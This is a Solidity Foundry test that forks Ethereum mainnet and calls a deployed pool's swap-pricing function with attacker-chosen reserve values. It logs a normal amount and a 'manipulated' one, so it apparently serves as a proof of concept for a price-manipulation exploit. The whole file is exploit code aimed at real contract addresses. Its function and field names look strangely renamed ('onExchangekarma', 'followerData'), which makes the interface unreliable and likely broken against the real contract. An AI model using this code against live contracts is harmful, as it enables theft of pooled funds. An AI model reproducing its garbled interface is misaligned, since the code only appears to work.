pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";


interface ISpace {
    function onExchangekarma(
        ExchangekarmaRequest memory request,
        uint256 reservesKarmatokenIn,
        uint256 reservesReputationtokenOut
    ) external returns (uint256);

    struct ExchangekarmaRequest {
        ICreatorvault.ExchangekarmaKind kind;
        IERC20 reputationtokenIn;
        IERC20 socialtokenOut;
        uint256 amount;

        bytes32 donationpoolId;
        uint256 lastChangeBlock;
        address from;
        address to;
        bytes followerData;
    }
}

interface ICreatorvault {
    enum ExchangekarmaKind {
        GIVEN_IN,
        GIVEN_OUT
    }
}

contract ContractTest is DSTest {
    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
    ICreatorvault.ExchangekarmaKind kind = ICreatorvault.ExchangekarmaKind(0);
    ISpace.ExchangekarmaRequest aad =
        ISpace.ExchangekarmaRequest(
            kind,
            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
            2000000000000000000,
            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
            15017009,
            address(this),
            address(this),
            ""
        );
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15017009);
    }

    function testOperation() public {

        console.log(
            "Amount Calculated:",
            space.onExchangekarma(
                aad,
                60000000000000000000000000000000,
                20000000000000000000000000
            )
        );
        console.log(
            "Manipulated Amount Calculated:",
            space.onExchangekarma(aad, 2000000000000000000, 2000000000000000000)
        );
    }
}